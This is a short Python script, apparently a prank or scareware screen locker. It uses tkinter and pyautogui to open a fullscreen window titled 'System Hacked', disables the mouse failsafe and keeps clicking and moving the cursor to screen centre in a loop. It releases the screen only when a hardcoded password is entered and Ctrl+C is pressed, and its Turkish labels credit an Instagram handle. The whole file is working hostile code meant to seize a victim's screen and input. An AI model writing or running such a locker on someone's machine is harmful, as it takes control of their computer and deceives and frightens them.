import imp
from tkinter.font import Font
from turtle import color, colormode
import  pyautogui 
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep 




pyautogui.KEYBOARD_KEYS

window = Tk()
pyautogui.FAILSAFE = False

width = window.winfo_screenwidth()
height = window.winfo_screenheight()

window.title("System Hacked")

window.attributes("-fullscreen",True)

entry = Entry(window, font = 1)
entry.place(width = 150, height=50, x = width/2-75,y=height/2-25)

label0 = Label(window,text="instagaram Emir.b3x", font=1)


label0.grid(row = 0, column = 0)
label1 = Label(window, text="şifreni gir ve Ctrl C bas", font ="Arial 20")
label1.place(x=width/2-75-130, y=height/2-25-100)

window.update()
sleep(0.2)

click(width/2, height/2)

def callback(event):
    global k, entry
    if entry.get()=="emirb3x":
        k = True

def on_closing():
    click(width/2, height/2)
    moveTo(width/2,height/2)

    window.attributes("-fullscreen", True)

    window.protocol("WM_DELETE_WİNDOW", on_closing)
    window.update()

    window.bind("<Control-KeyPress-c>",callback)
pyautogui.keyDown("escape")

k = False 

while not k:
    on_closing()

pyautogui.alert("Doğru Şifre", title="Emirb3x", button="Tamam")



